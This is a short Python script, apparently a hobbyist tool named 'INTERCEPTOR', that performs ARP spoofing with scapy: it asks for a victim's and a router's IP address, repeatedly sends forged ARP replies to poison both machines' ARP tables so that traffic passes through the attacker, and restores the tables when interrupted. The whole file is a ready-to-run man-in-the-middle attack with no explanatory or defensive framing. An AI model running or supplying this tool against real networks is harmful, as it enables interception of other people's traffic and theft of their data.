from http import client
from tabnanny import verbose
from async_timeout import timeout
import scapy.all as scapy
import time
from termcolor import colored

def spoof(victim_ip, spoof_ip):
    victim_mac = get_mac(victim_ip)
    pkt = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_mac = mac/arp_request
    result_list = scapy.srp(arp_request_mac, timeout=1, verbose=False)[0]

    return result_list[0][1].hwsrc

def  restore_default(destination_ip, source_ip):
    try:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        pkt = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(pkt, count=4, verbose=False)
    except IndexError:
        time.sleep(2)
        restore_default(destination_ip, source_ip)

pkt_count = 0
victim_ip = input(colored("</> Enter Victim's IP: ", 'blue'))
router_ip = input(colored("</> Enter Router / Switch's IP: ", 'blue'))
try:
    while True:
        try:
            spoof(victim_ip, router_ip)
            spoof(router_ip, victim_ip)
            pkt_count += 2
            print(colored("\r</> " + str(pkt_count) + " Packets sent </>", 'green'), end="")
            time.sleep(2)
        except IndexError:
            time.sleep(2)
            continue
except KeyboardInterrupt:
    print(colored("</> Restoring default values of ARP tables </>", 'red'))
    restore_default(victim_ip, router_ip)
    restore_default(router_ip, victim_ip)
    print(colored("\n</> Closing INTERCEPTOR!! </>\n", 'red'))